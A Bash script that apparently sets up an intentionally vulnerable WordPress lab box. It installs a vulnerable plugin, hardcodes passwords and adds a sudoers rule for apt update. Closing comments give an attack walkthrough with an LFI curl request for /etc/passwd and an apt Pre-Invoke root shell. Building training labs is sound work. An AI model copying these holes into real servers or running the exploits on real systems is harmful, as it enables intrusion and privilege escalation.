#!/bin/bash

if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Run this as root"
    exit
fi

while true; do
    read -p "Did you run 'sudo apt upgrade' and restart the instance? " yn
    case $yn in
        [Yy]* ) break;;
        [Nn]* ) exit;;
        * ) echo "Please answer yes or no.";;
    esac
done

read -p 'Enter EC2 Instance DNS Name: ' dnsname
password="Th15p@55w0RdD035n0TW0RkF0RPr1vESC"

updateUbuntu(){
	apt update
	apt install  apache2 \
                 ghostscript \
                 libapache2-mod-php \
                 mysql-server \
                 php \
                 php-bcmath \
                 php-curl \
                 php-imagick \
                 php-intl \
                 php-json \
                 php-mbstring \
                 php-mysql \
                 php-xml \
                 php-zip \
                 unzip  --yes
}

phpUpdate(){
	sed -i 's/upload_max_filesize = 2M/upload_max_filesize = 20M/' /etc/php/8.1/apache2/php.ini
}
makeWWW(){
	mkdir -p /srv/www
	chown steve: /srv/www
	wget https://wordpress.org/latest.tar.gz
	sudo -u steve tar zx -f latest.tar.gz -C /srv/www 
	echo '<VirtualHost *:80>
    	DocumentRoot /srv/www/wordpress
    	<Directory /srv/www/wordpress>
        	Options FollowSymLinks
        	AllowOverride Limit Options FileInfo
        	DirectoryIndex index.php
        	Require all granted
    	</Directory>
    	<Directory /srv/www/wordpress/wp-content>
        	Options FollowSymLinks
        	Require all granted
    	</Directory>
		</VirtualHost>' > /etc/apache2/sites-available/wordpress.conf
}

mysqlStuff(){
	mysql --user=root --execute="CREATE DATABASE wordpress;"
	mysql --user=root --execute="CREATE USER wordpress@localhost IDENTIFIED BY 'Th15p@55w0RdD035n0TW0RkF0RPr1vESC';"
	mysql --user=root --execute=" GRANT ALL PRIVILEGES ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES"
	service mysql start
}

wordPress(){
	sudo -u steve cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php
	sudo -u steve sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php
	sudo -u steve sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php
	sudo -u steve sed -i "s/password_here/$password/" /srv/www/wordpress/wp-config.php
	sudo -u steve sed -i -e '$adefine("WP_MEMORY_LIMIT", "256M");' /srv/www/wordpress/wp-config.php 
	a2ensite wordpress
	a2enmod rewrite
	a2dissite 000-default
	service apache2 reload
}

moreWordpress(){
	cd /srv/www/wordpress/wp-content/plugins
	wget https://downloads.wordpress.org/plugin/disable-xml-rpc.1.0.1.zip
	unzip disable-xml-rpc.1.0.1.zip
	wp plugin activate disable-xml-rpc
	wget https://www.exploit-db.com/apps/5be8270e880c445e11c59597497468bb-site-editor.zip
	unzip 5be8270e880c445e11c59597497468bb-site-editor.zip
	rm *.zip
	cd /tmp;sudo curl -O https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
	chmod +x wp-cli.phar
	mv wp-cli.phar /usr/local/bin/wp
	cd /srv/www/wordpress/
	rm -rf wp-content/plugins/akismet
	sudo -u steve wp core install --url=$dnsname --title="Super Real Site" --admin_user=steve --admin_email='steve@localhost.com' 1>/root/wordpressadmin.txt
	sleep 2
	sudo -u steve wp post create --post_title="New Update to Super Real Site!" --post_content="We’re proud to announce that we’ve recently installed new plugins to help our collaborators make the most out of this website. Don’t forget to try them out!" --post_status=publish
	#sudo -u steve wp post create --post_title="Be Aggressive! B. E. Agressive!" --post_content="The UM cheerleaders have finally brought home the gold thanks to their agressive efforts. We could all learn a thing or two about being aggressive from this team. Whenever you're just looking around you should try being aggressive too!" --post_status=publish
	sudo -u steve wp post delete 1
}

userStuff(){
	useradd -s /bin/bash -p $(perl -e'print crypt("w0rdpr355I54ann0y1NG", "aa")') -m -N steve
	echo "steve ALL=(root) NOPASSWD: /usr/bin/apt update" >> /etc/sudoers
	echo "steve ALL=(root) NOPASSWD: /usr/bin/apt update *" >> /etc/sudoers
	sudo -u steve mkdir /home/steve/.ssh
	sudo -u steve ssh-keygen -f /home/steve/.ssh/id_rsa -N ""
	systemctl reload sshd
	echo -ne "$dnsname root"|md5sum > /root/proof.txt
	echo -ne "$dnsname local"|md5sum > /home/steve/local.txt
	echo -e "Hey Steve,\ndon't forget that it's your job to run the weekly update on this machine.\nYou'll have to do it manually.\nMake sure you get it done since I already gave you permission.  -admin" > /home/steve/admin_note.txt
	chmod 644 /home/steve/admin_note.txt

}

printf "\n\033[33;1mupdating/installing software\033[0m\n"
updateUbuntu 
printf "\n\033[33;1mcreate user/set sudo and ssh-keys\033[0m\n"
userStuff
printf "\n\033[33;1mmaking directories\033[0m\n"
makeWWW
printf "\n\033[33;1mconfiguring mysql\033[0m\n"
mysqlStuff
printf "\n\033[33;1minstalling wordpress\033[0m\n"
wordPress
printf "\n\033[33;1mchanging php.ini\033[0m\n"
phpUpdate
printf "\n\033[33;1minstall plugins/update database/post content\033[0m\n"
moreWordpress
usermod -s /sbin/nologin ubuntu


# make sure ubuntu and kali are on same network/vpc
# make sure kali allows 445 or some ports inbound

###############

# Walkthrough
# nmap -sCV from internal IP finds 22 and wordpress site on 80
# wpscan --url http:// site --plugins-detection aggressive
# finds site-editor plugin
# LFI on plugin /etc/passwd finds cleartext password
# curl http:// site /wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
# ssh in as steve
# sudo -l finds apt usage
# sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh